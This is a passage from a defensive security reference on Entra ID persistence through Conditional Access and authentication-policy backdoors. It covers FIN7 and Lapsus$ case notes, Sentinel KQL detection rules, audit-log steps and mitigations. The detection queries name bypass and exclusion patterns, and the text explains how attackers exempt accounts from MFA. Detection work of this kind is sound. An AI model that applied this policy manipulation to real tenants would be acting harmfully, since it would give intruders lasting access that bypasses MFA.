**Reference:** [CISA Alert: Lapsus$ Group Claims Responsibility for Attacks](https://www.cisa.gov/)

---

### Example 3: FIN7 Entra ID Persistence via Policy Manipulation

**Target:** Retail and hospitality sectors

**Timeline:** 2023-2024

**Technique Status:** Active, part of multi-stage ransomware operations

**Impact:** FIN7 created authentication method policies that allowed passwordless, non-MFA access for specific service accounts. This provided a fallback persistence mechanism if Conditional Access policies were later corrected. Policies were discovered during threat hunting in isolated customer environments but were likely present across multiple victim organizations.

**Reference:** [Mandiant/Google Threat Intelligence - FIN7 Entra ID Campaigns](https://www.mandiant.com/)

---

## 8. ATOMIC RED TEAM TEST (If Applicable)

**Atomic Test Mapping:** No official Atomic Red Team test currently exists for this cloud-native Entra ID technique. However, the following custom Atomic Red Team tests can be developed:

**Custom Test 1: Create Conditional Access Policy with Exclusion**

```yaml
execution:
  - sh: |
      # Test creating a Conditional Access policy with exclusion
      # Requires Global Administrator or Conditional Access Administrator
      # Reference: PERSIST-IMPAIR-002
```

**References:**
- [Atomic Red Team GitHub - Custom Cloud Tests](https://github.com/redcanaryco/atomic-red-team)
- [AzureAD Attack Simulation Playbooks](https://microsoft.com/security)

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Suspicious Conditional Access Policy Modifications

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy.user.userPrincipalName, TargetResources
- **Alert Severity:** High
- **Frequency:** Run every 15 minutes

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Update policy", "Add policy")
| where TargetResources has "ConditionalAccessPolicy"
| extend ModifiedUser = InitiatedBy.user.userPrincipalName
| extend PolicyName = extract(@"displayName":(.*?),", tostring(TargetResources))
| where PolicyName has_any ("backdoor", "bypass", "exclusion", "service account", "legacy") or PolicyName has_regex @"[Ee]xempt|[Ee]xclud|[Bb]ypass|[Uu]nauthoriz"
| project TimeGenerated, ModifiedUser, OperationName, PolicyName, TargetResources
| order by TimeGenerated desc
```

**What This Detects:**
- Any Conditional Access policy creation or modification
- Policies with suspicious names suggesting bypass or exclusion purposes
- Modifications by users not typically responsible for policy management

**Manual Configuration Steps:**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Suspicious Conditional Access Policy Modification`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `1 hour`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

### Query 2: Detect Successful Sign-In from MFA-Excluded Users

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** UserPrincipalName, ConditionalAccessStatus, MfaDetail
- **Alert Severity:** Critical
- **Frequency:** Real-time (5 minutes)

**KQL Query:**

```kusto
let BackdoorAccounts = dynamic(["attacker@contoso.com", "service-rogue@contoso.com"]);  // Update with known compromised accounts

SigninLogs
| where UserPrincipalName in (BackdoorAccounts)
| where ResultType == 0  // Successful sign-in
| where ConditionalAccessStatus == "notApplied"  // CA not applied (likely due to exclusion)
| where MfaDetail == "Not required by conditional access"  // MFA not enforced
| project TimeGenerated, UserPrincipalName, IpAddress, Location, AppDisplayName, ConditionalAccessStatus
| order by TimeGenerated desc
```

**What This Detects:**
- Successful sign-ins from accounts that should have been subject to MFA
- Sign-ins where Conditional Access was bypassed
- Unusual sign-in locations or IP addresses for those accounts

**Manual Configuration Steps:**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Successful Sign-In from MFA-Excluded User`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste the KQL query above
   - Update the `BackdoorAccounts` dynamic list with known or suspected compromised accounts
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

## 10. WINDOWS EVENT LOG MONITORING

**Not Applicable** - This is a cloud-native Entra ID technique with no local Windows Event Log signature. Detection relies entirely on cloud audit logs (see Microsoft Sentinel section above).

---

## 11. SYSMON DETECTION PATTERNS

**Not Applicable** - Sysmon cannot detect cloud-based policy modifications. Detection requires cloud-based logging and queries (see Microsoft Sentinel section above).

---

## 12. ADDITIONAL DETECTION GUIDANCE

### Unified Audit Log (Office 365) Monitoring

**Manual Configuration Steps:**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Click **Audit** (left menu)
3. Click **Search**
4. Set **Date range** to past 90 days
5. Under **Activities**, select:
   - "Update conditional access policy"
   - "Create conditional access policy"
   - "Delete conditional access policy"
   - "Update authentication method policy"
6. Click **Search**
7. Review results for suspicious modifications
8. Export to CSV for archival and analysis

**PowerShell Query (Automated Logging):**

```powershell
# Search for policy modifications over the past 30 days
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -Operations "Update policy", "Add policy", "Delete policy" `
    -ResultSize 5000 | 
    Select-Object UserIds, Operations, CreationDate, AuditData |
    Export-Csv -Path "C:\Reports\PolicyAuditLog_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation
```

---

## Conclusion

Authentication policy backdoors represent a **critical persistence mechanism** in cloud-native environments. They are often missed during incident response because they blend seamlessly with routine administrative activities. Organizations must implement automated detection, strict change approval workflows, and continuous policy audits to prevent attackers from establishing long-term persistence through policy manipulation.

The effectiveness of this technique is significantly reduced through the combination of **Continuous Access Evaluation (CAE), multi-person approval workflows, regular policy audits, and immediate revocation of compromised sessions**.

---